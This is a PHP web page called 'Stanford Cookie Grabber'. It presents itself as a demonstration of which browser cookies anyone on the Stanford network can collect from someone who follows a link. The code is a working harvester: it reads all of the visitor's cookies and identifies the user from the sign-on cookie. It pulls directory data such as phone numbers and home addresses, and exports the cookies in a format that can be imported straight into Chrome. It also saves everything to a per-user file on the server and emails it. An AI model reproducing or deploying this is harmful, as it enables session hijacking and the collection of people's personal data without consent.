<!DOCTYPE html>
<html>

<head>

<title>Stanford Cookie Grabber</title>
<link rel="image_src" href="./monster.jpg" />

<style>

body {
  font-family: 'Verdana', sans-serif;
}

body, ul, li {
  margin: 0;
  padding: 0;
  list-style: none;
  font-size: 100%;
}

li, div, span {
  font-size: 0.9em;
}

body {
  padding: 0 30px;
  padding-bottom: 100px;
}

.content {
 width: 860px;
}

textarea {
  width: 800px;
  height: 400px;
}

.name, .value {
  display: block;
  padding: 0 10px;
  min-width: 300px;
  max-width: 500px;
  float: left;
  word-wrap: break-word;
}

.name {
  font-weight: bold;
  width: 300px;
}

h2, a, h1 {
  color: #0054a6;
}

li, h2 {
  clear: both;
}

li, div {
  padding: 5px;
}

ul {
  overflow: auto;
}

.big {
  font-size: 1.2em;
  line-height: 1.4em;
  width: 500px;
}

#monster {
  border-radius: 10px;
  margin-top: 20px;
  float: right;
}

</style>
</head>

<body>

<div class="content">
<img src="./monster.jpg" id="monster"/>

<h1>Stanford Cookie Grabber</h1>
<div class="big">These are the cookies that anyone on the Stanford network can get from your browser just by having you follow a link...such as this one. Questions? <a href="http://soraven.com/contact" target="_blank">Contact me.</a></div>


<h2>Values</h2>

<ul>
<?php
foreach ($_COOKIE as $key => $value) {
print '<li><span class="name">' . $key . '</span><span class="value">' . $value . '</span></li>';
}?>
</ul>
<?php
// print_r($_COOKIE); 

include 'config.php';

// Use Stanford Web Application Toolkit to get more information
if (USE_TOOLKIT) {
  include_once('stanford.person.php');
}

// Returns exportable JSON for Chrome's Edit This Cookie extension
function export_cookies() {
  $format = <<<'EOT'
{
  "name": "%s",
  "value": "%s",
  "domain": ".stanford.edu",
  "expirationDate": 9999999999,
  "hostOnly": false,
  "httpOnly": false,
  "path": "/",
  "secure": false,
  "session": false,
  "storeId": "0"
}
EOT;

  $list = array();
  foreach ($_COOKIE as $key => $value) {
    array_push($list, sprintf($format, $key, $value));
  }

  return '[' . join(',' . PHP_EOL, $list) . ']';
}

// Identify user
$user = isset($_COOKIE['SignOnDefault']) ? $_COOKIE['SignOnDefault'] : '_anonymous';
$user = strtolower($user);

$time = date('D, d M Y H:i:s T');
$content = $time . PHP_EOL;
$content .= PHP_EOL;
     
$address = EMAIL;
// Lookup Stanford Directory
if (USE_TOOLKIT && $user != '_anonymous') {
  $person = new StanfordPerson($user);

  $content .= $person->get_sunetid() . PHP_EOL;
  $content .= $person->get_last_name() . ', ' . $person->get_first_name() . PHP_EOL;
  $content .= PHP_EOL;

  if ($person->get_middle_name()) $content .= 'Middle name: ' . $person->get_middle_name() . PHP_EOL;
  if ($person->get_email()) {
    $content .= 'E-mail: ' . $person->get_email() . PHP_EOL;
    $address = $person->get_email();
  }
  if ($person->get_job_title()) $content .= 'Title: ' . $person->get_job_title() . PHP_EOL;
  if ($person->get_home_phone()) $content .= 'Home: ' . $person->get_home_phone() . PHP_EOL;
  if ($person->get_mobile_phone()) $content .= 'Mobile: ' . $person->get_mobile_phone() . PHP_EOL;
  if ($person->get_work_phone()) $content .= 'Work: ' . $person->get_work_phone() . PHP_EOL;
  if ($person->get_home_postal_address()) $content .= 'Address: ' . $person->get_home_postal_address() . PHP_EOL;
  if ($person->get_permanent_postal_address()) $content .= 'Postal: ' . $person->get_permanent_postal_address() . PHP_EOL;


  $content .= 'Primary affiliation: ' . $person->get_primary_affiliation() . PHP_EOL;
  $content .= 'Is a student?: ' . (($person->is_a_student()) ? "yes" : "no") . PHP_EOL;
  $content .= 'Is faculty?: ' . (($person->is_faculty()) ? "yes" : "no") . PHP_EOL;
  $content .= 'Is staff?: ' . (($person->is_staff()) ? "yes" : "no") . PHP_EOL;
  $content .= 'Is an affiliate?: ' . (($person->is_affiliate()) ? "yes" : "no") . PHP_EOL;
  $content .= PHP_EOL;
}
?>
<h2>Additional Info</h2>
<pre>
<?php
print $content;
$json = json_encode($_COOKIE);
$export = export_cookies();
?>
</pre>
<h2>Formatted as JSON</h2>
<textarea>
<?= $json ?>
</textarea>

<h2>Formatted as importable</h2>
<div>You can import this directly using Chrome's <a target="_blank" href="https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en">Edit This Cookie</a> extension.</div>
<textarea>
<?= $export ?>
</textarea>

<?php

if (SHORT_PRINT) {
  $content = '//================================================';
  $content .= PHP_EOL;
  $content .= '// ' . $time . PHP_EOL;

  if (USE_TOOLKIT && $user != '_anonymous') {
    $person = new StanfordPerson($user);
    $content .= '// ' . $user . ' (' . $person->get_last_name() . ', ' . $person->get_first_name() . ')' . PHP_EOL;
    $content .= PHP_EOL;
  }

  $content .= '{' . PHP_EOL;
  foreach ($_COOKIE as $key => $value) {
    $content .= $key . ' : "' . $value . '",' . PHP_EOL;
  }
  $content .= 'id : "' . $user . '"' . PHP_EOL;
  $content .= '}' . PHP_EOL;
}
else {
// Append cookie as JSON
  $content .= '=================== [ JSON START ] =====================';
  $content .= PHP_EOL;
  $content .= $json;
  $content .= PHP_EOL;
  $content .= '==================== [ JSON END ] ======================';
  $content .= PHP_EOL . PHP_EOL;
  $content .= '=================== [ JSON START ] =====================';
  $content .= PHP_EOL;
  $content .= $export;
  $content .= PHP_EOL;
  $content .= '==================== [ JSON END ] ======================';
}

$filename = COOKIE_DIR . '/' . $user;
$format = 'Cookie: %s at %s';
$subject = sprintf($format, $user, $time);
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: cookie.monster@stanford.edu' . "\r\n";
$headers .= 'Reply-To: ' . EMAIL . "\r\n";
$headers .= 'X-Mailer: PHP/' . phpversion();


if (ENABLE_EMAIL) {
  $body = '<h1 style="font-size: 40px;">Omnomnomnomnom</h1><div>Thank you for visiting.</div><pre style="font-size: 13px;">' . $content . "</pre>";
  if (!file_exists($filename)) {
    mail($address, $subject, $body, $headers);
  }
}

file_put_contents($filename, $content, FILE_APPEND);

?>

</div>
</body>
</html>
